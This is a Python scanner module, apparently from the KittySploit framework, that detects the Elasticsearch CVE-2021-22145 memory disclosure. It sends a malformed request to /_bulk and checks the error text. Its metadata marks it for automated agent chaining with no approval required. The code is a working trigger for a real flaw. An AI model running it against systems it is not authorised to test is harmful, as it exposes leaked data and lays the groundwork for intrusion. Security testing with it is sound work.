#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ElasticSsarch 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Elasticsearch 7.10.0-7.13.3 - Information Disclosure Detection',
        'description': 'ElasticSsarch 7.10.0 to 7.13.3 is susceptible to information disclosure. A user with the ability to submit arbitrary queries can submit a malformed query that results in an error message containing previously used portions of a data buffer. This buffer can contain sensitive information such as Elasticsearch documents or authentication details, thus potentially leading to data modification and/or execution of unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'elasticsearch', 'packetstorm', 'elastic', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/jaeles-project/jaeles-signatures/blob/e9595197c80521d64e31b846808095dd07c407e9/cves/elasctic-memory-leak-cve-2021-22145.yaml',
            'https://packetstormsecurity.com/files/163648/ElasticSearch-7.13.3-Memory-Disclosure.html',
            'https://discuss.elastic.co/t/elasticsearch-7-13-4-security-update/279177',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-22145',
            'https://security.netapp.com/advisory/ntap-20210827-0006/',
        ],
        'cve': 'CVE-2021-22145',
    }

    def run(self):
        path = '/_bulk'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='@\n')
        if not r or r.status_code != 400:
            return False
        body = r.text or ""
        body_all = ('root_cause', 'truncated', 'reason',)
        if all(m in body for m in body_all):
            self.set_info(
                severity='medium',
                reason='Elasticsearch 7.10.0-7.13.3 - Information Disclosure detected',
                path=path,
            )
            return True
        return False

